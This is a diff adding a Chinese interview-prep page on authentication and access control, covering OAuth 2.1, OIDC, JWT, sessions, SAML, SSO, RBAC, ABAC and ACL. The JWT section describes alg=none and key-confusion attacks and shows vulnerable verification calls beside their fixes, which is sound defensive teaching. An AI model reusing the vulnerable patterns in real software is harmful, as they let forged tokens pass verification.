+<li><strong>废弃密码模式</strong>：<code>grant_type=password</code> 完全移除。替代方案：使用授权码模式或 ROPC 迁移到专用身份协议（如 OIDC）。</li>
+<li><strong>PKCE 必选</strong>：所有使用授权码模式的客户端都必须使用 PKCE，包括机密客户端。</li>
+<li><strong>Refresh Token 安全</strong>：对于公开客户端，refresh token 必须是 sender-constrained 或一次性使用（rotation）。防止 refresh token 泄露后的持续访问。</li>
+<li><strong>Redirect URI 严格匹配</strong>：要求 exact match（精确匹配），不再允许 pattern match 或 wildcard。</li>
+<li><strong>Bearer Token 安全</strong>：明确要求 token 使用 HTTPS 传输，推荐 sender-constrained tokens（如 mTLS-bound tokens 或 DPoP）。</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>迁移影响</strong>：如果你的系统还在用隐式模式或密码模式，需要立即规划迁移。密码模式迁移到授权码模式 + PKCE 意味着需要用户交互界面。对于 M2M 场景，客户端凭证模式在 2.1 中仍合法，但需要注意 client secret 的静态凭证生命周期管理。</li>
+<li>**向前兼容吗？**兼容的。OAuth 2.1 相当于从协议层面砍掉了已经被 BCP 宣判死刑的模式。如果授权服务器继续接受旧模式，它本质上仍是 2.0 实现。</li>
+<li><strong>OAuth 2.1 不覆盖但重要的点</strong>：M2M 认证仍依赖静态 client secret，这是已知攻击面。Workload Identity Federation 和 SPIFFE 是补充方案。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://oauth.net/2.1/">https://oauth.net/2.1/</a></li>
+<li>RFC 9700 - OAuth 2.0 Security Best Current Practice</li>
+<li>“OAuth 2.1 Authorization Framework” draft-ietf-oauth-v2-1</li>
+</ul>
+<h3 id="Q3：OIDC（OpenID-Connect）是什么？和-OAuth-2-0-的关系？"><a href="#Q3：OIDC（OpenID-Connect）是什么？和-OAuth-2-0-的关系？" class="headerlink" title="Q3：OIDC（OpenID Connect）是什么？和 OAuth 2.0 的关系？"></a>Q3：OIDC（OpenID Connect）是什么？和 OAuth 2.0 的关系？</h3><p><strong>标准答案</strong></p>
+<p>OIDC 是在 OAuth 2.0 之上的<strong>身份认证层</strong>。OAuth 2.0 本身只做<strong>授权</strong>（”允许应用访问这些资源”），不做<strong>认证</strong>（”确认用户是谁”）。OIDC 通过引入 <strong>ID Token</strong>（JWT 格式）解决了这个问题。</p>
+<p><strong>核心概念：</strong></p>
+<ul>
+<li><strong>ID Token</strong>：JWT 格式的身份声明，包含 <code>iss</code>（签发者）、<code>sub</code>（用户标识）、<code>aud</code>（受众）、<code>exp</code>、<code>iat</code>、<code>nonce</code> 等标准 claim。</li>
+<li><strong>UserInfo Endpoint</strong>：OIDC 提供的 RESTful 接口，返回用户的标准 claim（name、email、picture 等）。</li>
+<li><strong>Discovery 文档</strong>：<code>/.well-known/openid-configuration</code> 发布授权服务器元数据（端点 URL、支持的 scope、签名算法等）。</li>
+<li><strong>Scopes</strong>：OIDC 引入 <code>openid</code> scope（必选），<code>profile</code>、<code>email</code>、<code>address</code>、<code>phone</code> 等标准 scope。</li>
+</ul>
+<p><strong>流程简化：</strong></p>
+<ol>
+<li>客户端发起认证请求（包含 <code>openid</code> scope）</li>
+<li>用户认证并同意</li>
+<li>授权服务器返回授权码</li>
+<li>客户端用授权码换取 ID Token + Access Token</li>
+<li>客户端验证 ID Token 的签名、iss、aud、exp、nonce</li>
+<li>（可选）用 Access Token 调用 UserInfo Endpoint 获取更多用户信息</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>为什么不直接用 OAuth 2.0 做认证？</strong> 典型错误：用 OAuth 2.0 授权码模式获取 access token，再调 API 拿用户信息。这种方案没有标准化的 ID Token，认证结果不可验证（没有签名，没有 nonce 防重放），容易受到混淆代理攻击（Confused Deputy Problem）。</li>
+<li><strong>ID Token 验证要点</strong>：验证签名（用 JWKS 端点获取公钥）、验证 <code>iss</code>（精确匹配）、验证 <code>aud</code>（必须包含自己的 client_id）、验证 <code>exp</code>、验证 <code>nonce</code>（防重放）。不要跳过任何一个步骤。</li>
+<li><strong>OIDC Flow 选择</strong>：Web 应用用 Authorization Code Flow + PKCE；纯 SPA 也是这套；M2M 不需要用户认证，直接用 OAuth 2.0 Client Credentials。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OpenID Connect Core 1.0 Specification</li>
+<li><a target="_blank" rel="noopener" href="https://openid.net/connect/">https://openid.net/connect/</a></li>
+<li><a target="_blank" rel="noopener" href="https://developers.google.com/identity/openid-connect/openid-connect">https://developers.google.com/identity/openid-connect/openid-connect</a></li>
+</ul>
+<h3 id="Q4：JWT-的结构、签名、常见漏洞及生产最佳实践"><a href="#Q4：JWT-的结构、签名、常见漏洞及生产最佳实践" class="headerlink" title="Q4：JWT 的结构、签名、常见漏洞及生产最佳实践"></a>Q4：JWT 的结构、签名、常见漏洞及生产最佳实践</h3><p><strong>标准答案</strong></p>
+<p><strong>JWT 结构</strong>：三段 base64url 编码的字符串，用 <code>.</code> 分隔。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header.payload.signature</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Header</strong>：<code>{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</code> — 包含算法和 token 类型</li>
+<li><strong>Payload</strong>：Claims（注册 claims、公共 claims、私有 claims）</li>
+<li><strong>Signature</strong>：对前两段的签名，算法由 header 指定</li>
+</ul>
+<p><strong>签名算法：</strong></p>
+<ul>
+<li><strong>HS256&#x2F;HS384&#x2F;HS512</strong>：HMAC + SHA，对称签名。同一方签名和验证。</li>
+<li><strong>RS256&#x2F;RS384&#x2F;RS512</strong>：RSA + SHA，非对称签名。私钥签名，公钥验证。</li>
+<li><strong>ES256&#x2F;ES384&#x2F;ES512</strong>：ECDSA + SHA，非对称签名。更高效的椭圆曲线。</li>
+<li><strong>EdDSA</strong>：Edwards Curve DSA，现代非对称签名。</li>
+</ul>
+<p><strong>常见漏洞：</strong></p>
+<ol>
+<li><p><strong>alg&#x3D;none 攻击</strong>：攻击者将 header 中的 <code>alg</code> 改为 <code>none</code>，服务端可能跳过签名验证。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误实现</span></span><br><span class="line">jwt.decode(token)  <span class="comment"># 未指定算法，可能接受 none</span></span><br><span class="line"><span class="comment"># 正确实现</span></span><br><span class="line">jwt.decode(token, verify=<span class="literal">True</span>, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>密钥混淆攻击（Key Confusion）</strong>：如果服务端使用 RSA 公钥验证，攻击者可以获取公钥，将 <code>alg</code> 改为 <code>HS256</code>，用公钥作为 HMAC 密钥签名。服务端（预期 RS256）误用 HS256 路径，用公钥验证通过。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 漏洞：未限制算法</span></span><br><span class="line">jwt.verify(token, public_key)</span><br><span class="line"><span class="comment"># 修复：明确指定算法</span></span><br><span class="line">jwt.verify(token, public_key, algorithms=[<span class="string">&#x27;RS256&#x27;</span>])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>密钥破解</strong>：对称密钥强度不足时，可被暴力破解。确保密钥熵 &gt;&#x3D; 256 bits。</p>
+</li>
+<li><p><strong>JWT 注入</strong>：服务端从用户输入构造 JWT，导致注入攻击。</p>
+</li>
+</ol>
+<p><strong>生产最佳实践：</strong></p>
+<ul>
+<li><strong>明确指定算法</strong>：验证时始终传递 <code>algorithms</code> 参数，不接受用户输入的算法</li>
+<li><strong>使用非对称签名</strong>：RS256&#x2F;ES256 优于 HS256，公钥可安全分发，私钥不存在于验证端</li>
+<li><strong>短过期时间</strong>：access token 15 分钟，refresh token 7-30 天</li>
+<li><strong>不在 JWT 中保存敏感数据</strong>：payload 只是 base64 编码而非加密</li>
+<li><strong>配合黑名单&#x2F;吊销列表</strong>：JWT 无状态的代价是无法即时吊销，需配合黑名单或短 TTL</li>
+<li><strong>使用 jti（JWT ID）</strong>：唯一标识，有助于检测重放</li>
+<li><strong>监听签名泄漏</strong>：使用强随机密钥，git 中不提交密钥文件</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>无状态 vs 有状态</strong>：JWT 无状态是双刃剑——不需要查数据库，但无法立即吊销。需要权衡：对安全要求高的场景（密码修改、账号冻结）必须维护黑名单。</li>
+<li><strong>JWT vs Opaque Token</strong>：Opaque Token 需要服务端查存储换取真实信息，适合需要即时吊销的高安全场景。JWT 适合低延迟、分布式场景但接受无法即时吊销的风险。两者可以组合：opaque token 做 access token，对应 payload 查 Redis 缓存 JWT 信息。</li>
+<li><strong>审计日志中的 JWT</strong>：JWT 的 payload 可被解码，且会出现在 HTTP headers 的 Authorization 中，可能被日志系统记录。敏感信息应该加密或使用 JWE（JSON Web Encryption）。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>RFC 7519 - JSON Web Token</li>
+<li>RFC 7515 - JSON Web Signature</li>
+<li><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></li>
+<li>OWASP JWT Cheat Sheet</li>
+</ul>
+<h3 id="Q5：Session-vs-JWT-选型决策树"><a href="#Q5：Session-vs-JWT-选型决策树" class="headerlink" title="Q5：Session vs JWT 选型决策树"></a>Q5：Session vs JWT 选型决策树</h3><p><strong>标准答案</strong></p>
+<p>这是一个经典的架构决策，没有绝对的对错，关键看场景。</p>
+<p><strong>Session（服务端存储）：</strong></p>
+<ul>
+<li><strong>优点</strong>：可即时吊销、不暴露数据结构、服务端完全控制</li>
+<li><strong>缺点</strong>：需要存储（内存&#x2F;Redis&#x2F;DB）、分布式需要会话共享、不适合跨域</li>
+</ul>
+<p><strong>JWT：</strong></p>
+<ul>
+<li><strong>优点</strong>：无状态、跨域友好（SSO）、减少数据库查询、适合移动端</li>
+<li><strong>缺点</strong>：无法即时吊销、payload 可解码、存储膨胀（header 大小）、轮换复杂性</li>
+</ul>
+<p><strong>决策树：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">需要即时吊销（封号/改密即时生效）?</span><br><span class="line">├── 是 → Session（或 Opaque Token + 查存储）</span><br><span class="line">└── 否 → JWT</span><br><span class="line">     ├── 单体应用、用户量不大?</span><br><span class="line">     │   └── Session 更简单，无需复杂基础设施</span><br><span class="line">     ├── 微服务/分布式?</span><br><span class="line">     │   ├── 多个服务需要共享认证状态?</span><br><span class="line">     │   │   ├── 全部在同一网关下? → 网关维护 Session</span><br><span class="line">     │   │   └── 多网关/跨域? → JWT</span><br><span class="line">     │   └── 内部服务间通信?</span><br><span class="line">     │       └── mTLS 或 Service Mesh 方案优先于 JWT</span><br><span class="line">     ├── 移动端/跨平台?</span><br><span class="line">     │   └── JWT（天然 Header-based，非 Cookie-based）</span><br><span class="line">     └── 需要 SSO?</span><br><span class="line">         └── JWT/OIDC</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>混合方案</strong>：生产中最常见的模式是 “JWT + 短过期 + Refresh Token Rotation”。JWT 15 分钟过期，使用 refresh token（可吊销、可轮换）换取新 JWT。这种方式兼顾了 JWT 的低延迟和 Session 的可吊销特性。</li>
+<li><strong>15 分钟空窗期</strong>：JWT 方案在过期前存在安全空窗——账户被封后 JWT 仍然有效。可通过检查用户状态拦截（请求进入时查 Redis 黑名单），但这又回到了有状态，需要权衡。</li>
+<li><strong>Header 大小问题</strong>：JWT 可能携带大量 claims，每次请求都带在 Authorization header 中，可能接近 Nginx&#x2F;AWS ALB 的 header 大小限制（通常 8K-16K）。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.blog/2022/03/07/stop-using-jwts-as-session-tokens/">https://stackoverflow.blog/2022/03/07/stop-using-jwts-as-session-tokens/</a></li>
+<li>OWASP Session Management Cheat Sheet</li>
+</ul>
+<h3 id="Q6：SAML-2-0-vs-OAuth-2-0-vs-OIDC-对比"><a href="#Q6：SAML-2-0-vs-OAuth-2-0-vs-OIDC-对比" class="headerlink" title="Q6：SAML 2.0 vs OAuth 2.0 vs OIDC 对比"></a>Q6：SAML 2.0 vs OAuth 2.0 vs OIDC 对比</h3><p><strong>标准答案</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>SAML 2.0</th>
+<th>OAuth 2.0</th>
+<th>OIDC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>目的</strong></td>
+<td>认证 + 授权</td>
+<td>仅授权</td>
+<td>认证 + 授权</td>
+</tr>
+<tr>
+<td><strong>传输格式</strong></td>
+<td>XML</td>
+<td>JSON</td>
+<td>JWT</td>
+</tr>
+<tr>
+<td><strong>主要 Token</strong></td>
+<td>SAML Assertion</td>
+<td>Access Token（Opaque&#x2F;JWT）</td>
+<td>ID Token（JWT）+ Access Token</td>
+</tr>
+<tr>
+<td><strong>使用场景</strong></td>
+<td>企业 SSO（ADFS&#x2F;Okta）</td>
+<td>API 授权、第三方登录</td>
+<td>现代 App 登录、API 授权</td>
+</tr>
+<tr>
+<td><strong>移动端支持</strong></td>
+<td>差（浏览器重定向）</td>
+<td>好（PKCE）</td>
+<td>好（OIDC Flow）</td>
+</tr>
+<tr>
+<td><strong>API 友好度</strong></td>
+<td>低（XML 笨重）</td>
+<td>高（JSON 轻量）</td>
+<td>高（JWT 标准 Claims）</td>
+</tr>
+<tr>
+<td><strong>协议层</strong></td>
+<td>浏览器 Profile + SOAP</td>
+<td>HTTP + JSON</td>
+<td>HTTP + JWT</td>
+</tr>
+<tr>
+<td><strong>身份提供方</strong></td>
+<td>IdP</td>
+<td>AS（Authorization Server）</td>
+<td>OP（OpenID Provider）</td>
+</tr>
+<tr>
+<td><strong>应用场景</strong></td>
+<td>企业入职&#x2F;离职流程、SaaS 联盟</td>
+<td>GitHub&#x2F;Google API 授权</td>
+<td>Google&#x2F;Facebook 登录</td>
+</tr>
+</tbody></table>
+<p><strong>选型建议：</strong></p>
+<ul>
+<li><strong>需要企业级 SSO + Legacy IdP 集成？</strong> → SAML 2.0（ADFS、Active Directory）</li>
+<li><strong>需要 API 授权（第三方 App 访问用户数据）？</strong> → OAuth 2.0</li>
+<li><strong>需要现代 App 登录（移动&#x2F;SPA）？</strong> → OIDC</li>
+<li><strong>SSO 同时需要 API 访问？</strong> → OIDC（最佳组合）</li>
+<li><strong>大多数现代项目</strong>：OIDC（因为它 &#x3D; OAuth 2.0 授权 + 标准化认证）</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>SAML 的持久力</strong>：虽然 XML 笨重，但企业界大量使用 SAML，因为它在企业 SSO 领域的标准地位（SAML 2.0 发布至今已有 20 年）。全栈开发者至少需要能读懂 SAML Assertion、理解 IdP-initiated 和 SP-initiated 流程。</li>
+<li><strong>混淆代理攻击（Confused Deputy）</strong>：OAuth 2.0 做认证时容易被第三方 App 冒充。OIDC 通过 ID Token 的 <code>aud</code> claim（唯一标识接收方）解决此问题。</li>
+<li><strong>SAML vs OAuth 联合场景</strong>：大型企业常见的模式是 SAML federation 做身份层，OAuth&#x2F;OIDC 做 API 授权层。Shibboleth + Keycloak 架构就是典型。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>SAML 2.0 Technical Overview</li>
+<li>OAuth 2.0 RFC 6749</li>
+<li>OpenID Connect Core 1.0</li>
+</ul>
+<h3 id="Q7：SSO-实现原理（CAS-SAML-OIDC）"><a href="#Q7：SSO-实现原理（CAS-SAML-OIDC）" class="headerlink" title="Q7：SSO 实现原理（CAS &#x2F; SAML &#x2F; OIDC）"></a>Q7：SSO 实现原理（CAS &#x2F; SAML &#x2F; OIDC）</h3><p><strong>标准答案</strong></p>
+<p>SSO 的核心思想：<strong>一次认证，多处访问</strong>。用户在一个系统登录后，访问其他关联系统时不需要重新输入密码。</p>
+<p><strong>三种主流实现：</strong></p>
+<p><strong>CAS（Central Authentication Service）</strong>：</p>
+<ul>
+<li>经典的 Web SSO 协议</li>
+<li>核心是 <strong>Ticket Granting Ticket (TGT)</strong> 和 <strong>Service Ticket (ST)</strong></li>
+<li>流程：用户访问 App A → 重定向到 CAS Server → CAS Server 检查是否有 TGT cookie → 没有则让用户登录 → 登录成功后设置 TGT cookie，生成 ST → 用户带 ST 访问 App A → App A 通过 CAS Server 验证 ST → 认证成功</li>
+<li>访问 App B 时：携带 TGT cookie 到 CAS Server，直接生成 ST 给 App B，无需再次登录</li>
+</ul>
+<p><strong>SAML（Security Assertion Markup Language）</strong>：</p>
+<ul>
+<li>IdP-initiated SSO：用户先从 IdP 登录，IdP 发送 SAML Assertion 到 SP</li>
+<li>SP-initiated SSO：用户访问 SP 受保护资源，SP 生成 AuthnRequest，重定向用户到 IdP，IdP 认证后发送 Assertion</li>
+<li>核心：XML 格式的 SAML Assertion（包含 Subject、Conditions、AttributeStatement、AuthnStatement）</li>
+</ul>
+<p><strong>OIDC（OpenID Connect）</strong>：</p>
+<ul>
+<li>基于 OAuth 2.0 的现代 SSO</li>
+<li>核心是 ID Token（JWT）+ 心跳检测（Session Management）</li>
+<li>支持 RP-initiated Logout 和 Session Logout 标准</li>
+<li>通过 <code>sid</code>（Session ID）claim 关联用户会话</li>
+</ul>
+<p><strong>生产实践要点：</strong></p>
+<ul>
+<li>SSO 不是银弹：跨域 SSO（不同域名）比同域 SSO 复杂得多</li>
+<li>单点退出（SLO）是难点：需要通知所有关联服务销毁会话</li>
+<li>高可用 IdP 是关键：IdP 挂了整个系统无法登录</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>同域 SSO</strong>：最简单，共享 Cookie（domain&#x3D;<code>.example.com</code>）。所有子域名应用读取同一个 Session。</li>
+<li><strong>跨域 SSO</strong>：需要协议支持（CAS&#x2F;SAML&#x2F;OIDC）。核心模式是主域名认证后，各子域名通过 token 换取本地 session。</li>
+<li><strong>Session 心跳</strong>：大型系统通常会做 Session 心跳检测，防止用户退出后认证信息残留。</li>
+<li><strong>SLO 的挑战</strong>：用户在一处登出后，IdP 需要通知所有已认证的服务。OIDC 的 RP-initiated Logout 和 SAML 的 <code>LogoutRequest</code> 都尝试解决这个问题，但网络分区、服务下线等情况会导致不完整注销。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>CAS Protocol Specification</li>
+<li>OASIS SAML 2.0 Specification</li>
+<li>OpenID Connect Session Management 1.0</li>
+</ul>
+<hr>
+<h2 id="0x01-权限模型"><a href="#0x01-权限模型" class="headerlink" title="0x01 权限模型"></a>0x01 权限模型</h2><h3 id="Q8：RBAC（Role-Based-Access-Control）核心概念和变体"><a href="#Q8：RBAC（Role-Based-Access-Control）核心概念和变体" class="headerlink" title="Q8：RBAC（Role-Based Access Control）核心概念和变体"></a>Q8：RBAC（Role-Based Access Control）核心概念和变体</h3><p><strong>标准答案</strong></p>
+<p><strong>核心 RBAC（RBAC0）</strong>：</p>
+<ul>
+<li><strong>用户（User）</strong>：系统操作者</li>
+<li><strong>角色（Role）</strong>：权限的集合，如 <code>admin</code>、<code>editor</code>、<code>viewer</code></li>
+<li><strong>权限（Permission）</strong>：对特定资源的操作，如 <code>document:write</code></li>
+<li><strong>用户分配角色，角色分配权限</strong>（User-Role Assignment + Role-Permission Assignment）</li>
+</ul>
+<p><strong>核心 RBAC 的三条规则：</strong></p>
+<ol>
+<li><strong>角色继承（RBAC1）</strong>：角色可以继承。<code>admin</code> 继承 <code>editor</code> 的所有权限，<code>editor</code> 继承 <code>viewer</code> 的所有权限。</li>
+<li><strong>职责分离（RBAC2&#x2F;SOD）</strong>：SOD（Separation of Duties）确保同一用户不能同时分配冲突角色。<ul>
+<li><strong>静态 SOD</strong>：用户不可同时分配 <code>order_approver</code> 和 <code>order_creator</code></li>
+<li><strong>动态 SOD</strong>：运行时检查，同一会话中不能同时扮演两个冲突角色</li>
+</ul>
+</li>
+<li><strong>约束</strong>：角色基数（一个角色最多 N 人）、先决条件角色（必须先有 A 角色才能分配 B 角色）</li>
+</ol>
+<p><strong>生产实现：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 标准 RBAC 表结构</span></span><br><span class="line">users         (id, name)</span><br><span class="line">roles         (id, name, parent_role_id)  <span class="comment">-- parent_role_id 实现角色继承</span></span><br><span class="line">permissions   (id, name, resource, action)</span><br><span class="line">user_roles    (user_id, role_id)</span><br><span class="line">role_permissions (role_id, permission_id)</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>RBAC 的粒度问题</strong>：传统 RBAC 的权限粒度是 “permission × resource” 的组合，当资源量巨大（如组织内有 10 万文件）时，无法为每个文件单独定义权限。这就是为什么 RBAC 需要与其他模型（如 ABAC）配合。</li>
+<li><strong>NIST RBAC 标准</strong>：美国国家标准与技术研究院（NIST）定义的 RBAC 模型，上述 RBAC0-RBAC2 就是 NIST 标准。</li>
+<li><strong>RBAC 的扁平化趋势</strong>：很多现代系统（如 GitHub、Auth0）倾向于扁平化角色层级，避免过深的继承带来的权限爆炸。保持 2-3 层角色层级。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>NIST RBAC Standard (ANSI&#x2F;INCITS 359-2004)</li>
+<li><a target="_blank" rel="noopener" href="https://csrc.nist.gov/projects/role-based-access-control">https://csrc.nist.gov/projects/role-based-access-control</a></li>
+</ul>
+<h3 id="Q9：ABAC（Attribute-Based-Access-Control）与-RBAC-对比"><a href="#Q9：ABAC（Attribute-Based-Access-Control）与-RBAC-对比" class="headerlink" title="Q9：ABAC（Attribute-Based Access Control）与 RBAC 对比"></a>Q9：ABAC（Attribute-Based Access Control）与 RBAC 对比</h3><p><strong>标准答案</strong></p>
+<p><strong>ABAC 核心概念</strong>：访问控制决策基于<strong>属性的逻辑组合</strong>。属性分为四类：</p>
+<ol>
+<li><strong>用户属性</strong>：部门、职级、安全等级、地理位置</li>
+<li><strong>资源属性</strong>：分类（机密&#x2F;内部&#x2F;公开）、所属项目、创建时间</li>
+<li><strong>操作属性</strong>：读&#x2F;写&#x2F;删&#x2F;执行</li>
+<li><strong>环境属性</strong>：时间、IP 地址、设备类型、网络环境</li>
+</ol>
+<p><strong>ABAC 策略示例（OPA &#x2F; Cedar 语言）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">允许: 当 用户.部门 = 资源.所属部门</span><br><span class="line">      且 用户.职级 &gt;= &quot;高级&quot;</span><br><span class="line">      且 操作 = &quot;读&quot;</span><br><span class="line">      且 环境.时间 在 09:00-18:00</span><br></pre></td></tr></table></figure>
+
+<p><strong>RBAC vs ABAC 对比：</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>RBAC</th>
+<th>ABAC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>决策依据</strong></td>
+<td>角色名称</td>
+<td>属性组合</td>
+</tr>
+<tr>
+<td><strong>粒度</strong></td>
+<td>粗到中</td>
+<td>细</td>
+</tr>
+<tr>
+<td><strong>灵活度</strong></td>
+<td>低（新增权限需建新角色）</td>
+<td>高（策略组合即可）</td>
+</tr>
+<tr>
+<td><strong>管理复杂度</strong></td>
+<td>低</td>
+<td>高</td>
+</tr>
+<tr>
+<td><strong>理解成本</strong></td>
+<td>低</td>
+<td>高</td>
+</tr>
+<tr>
+<td><strong>性能</strong></td>
+<td>快（查表）</td>
+<td>较慢（策略引擎评估）</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td>CRUD 后台、简单权限</td>
+<td>数据分级隔离、合规场景</td>
+</tr>
+<tr>
+<td><strong>策略变更</strong></td>
+<td>改角色</td>
+<td>改策略（零部署变更）</td>
+</tr>
+</tbody></table>
+<p><strong>选型建议：</strong></p>
+<ul>
+<li><strong>权限规则简单、不频繁变化？</strong> → RBAC</li>
+<li><strong>需要基于上下文（时间、地点、设备）做权限判断？</strong> → ABAC 或 RBAC + ABAC 混合</li>
+<li><strong>合规要求（如 GDPR 数据分类控制）？</strong> → ABAC</li>
+</ul>
+<p><strong>政策引擎：</strong> OPA（Open Policy Agent）、Cedar（AWS 开源）、Casbin（内嵌库）。</p>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>混合模型（RBAC + ABAC）</strong>：生产中最常见的模式。用 RBAC 做粗粒度角色控制（”谁可以进后台”），用 ABAC 做细粒度数据过滤（”用户只看到自己部门的文档”）。</li>
+<li><strong>Cedar vs OPA</strong>：Cedar 是 AWS 为 Amazon Verified Permissions 开发的策略语言，语法更接近自然语言，学习曲线低。OPA 使用 Rego 语言，功能强大但语法复杂。Cedar 更适合权限模型，OPA 能力更通用。</li>
+<li><strong>ABAC 的性能考量</strong>：每个决策都需要评估策略，设计不当会成为性能瓶颈。缓存策略评估结果、使用 indexed attributes 可以优化。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>NIST ABAC Definition (SP 800-162)</li>
+<li>Open Policy Agent: <a target="_blank" rel="noopener" href="https://www.openpolicyagent.org/">https://www.openpolicyagent.org/</a></li>
+<li>Cedar: <a target="_blank" rel="noopener" href="https://www.cedarpolicy.com/">https://www.cedarpolicy.com/</a></li>
+</ul>
+<h3 id="Q10：ACL-vs-RBAC-vs-ABAC-选型对比"><a href="#Q10：ACL-vs-RBAC-vs-ABAC-选型对比" class="headerlink" title="Q10：ACL vs RBAC vs ABAC 选型对比"></a>Q10：ACL vs RBAC vs ABAC 选型对比</h3><p><strong>标准答案</strong></p>
+<table>
+<thead>
+<tr>
+<th>模型</th>
+<th>核心机制</th>
+<th>优点</th>
+<th>缺点</th>
+<th>典型场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ACL</strong></td>
+<td>每个资源记录谁可以做什么</td>
+<td>简单直观、精细控制</td>
+<td>管理开销大、扩展性差</td>
+<td>文件系统、S3 Bucket Policy</td>
+</tr>
+<tr>
+<td><strong>RBAC</strong></td>
+<td>通过角色间接分配权限</td>
+<td>管理简便、可扩展</td>
+<td>粒度受限、role explosion</td>
+<td>企业管理系统、后台管理</td>
+</tr>
+<tr>
+<td><strong>ABAC</strong></td>
+<td>基于属性规则动态决策</td>
+<td>极灵活、上下文感知</td>
+<td>复杂、性能开销</td>
+<td>多云权限、数据分级、合规</td>
+</tr>
+</tbody></table>
+<p><strong>生产选择矩阵：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">系统用户规模 &lt; 1000，权限规则稳定？</span><br><span class="line">├── 是 → ACL 或简单 RBAC</span><br><span class="line">└── 否</span><br><span class="line">    ├── 标准企业应用 → RBAC（角色层级 ≤ 3 层）</span><br><span class="line">    ├── 数据敏感、合规要求高 → RBAC + ABAC 混合</span><br><span class="line">    ├── 微服务间授权 → ABAC（OPA/Cedar）</span><br><span class="line">    └── 文件存储授权 → ACL（S3/Bucket Policy）</span><br></pre></td></tr></table></figure>
+
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Role Explosion（角色爆炸）</strong>：RBAC 的典型问题。当组织维度多（部门×城市×职级），假如每个排列组合都需要一个角色，角色数量会指数增长。解决方案是引入属性维度过渡到 RBAC + ABAC。</li>
+<li><strong>Google Zanzibar</strong>：Google 的全球授权系统（SpiceDB 是其开源版本），使用关系型模型（ReBAC），是 ACL&#x2F;RBAC&#x2F;ABAC 之外的第四条路径。通过 <code>关系图</code>（如：user 是 org 的 member，org 是 doc 的 owner）来处理大规模授权。适合社交网络（谁可以看我的照片）。</li>
+<li><strong>S3 Bucket Policy 的 ACL 模型</strong>：ACL 在现代云服务中仍有重要地位。S3 的 Bucket Policy、IAM Policy 本质上是基于 attribute 的 ACL（用户属性 + 资源属性 + 操作）。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>AWS IAM Policy 设计模式</li>
+<li>Google Zanzibar Paper: “Zanzibar: Google’s Consistent, Global Authorization System”</li>
+</ul>
+<h3 id="Q11：Casbin-轻量级权限管理库"><a href="#Q11：Casbin-轻量级权限管理库" class="headerlink" title="Q11：Casbin 轻量级权限管理库"></a>Q11：Casbin 轻量级权限管理库</h3><p><strong>标准答案</strong></p>
+<p>Casbin 是一个跨语言的访问控制库（Go、Java、Node.js、Python 等），支持 ACL、RBAC、ABAC 等多种模型。</p>
+<p><strong>核心思想：</strong></p>
+<ul>
+<li><strong>PERM 元模型（Policy, Effect, Request, Matchers）</strong></li>
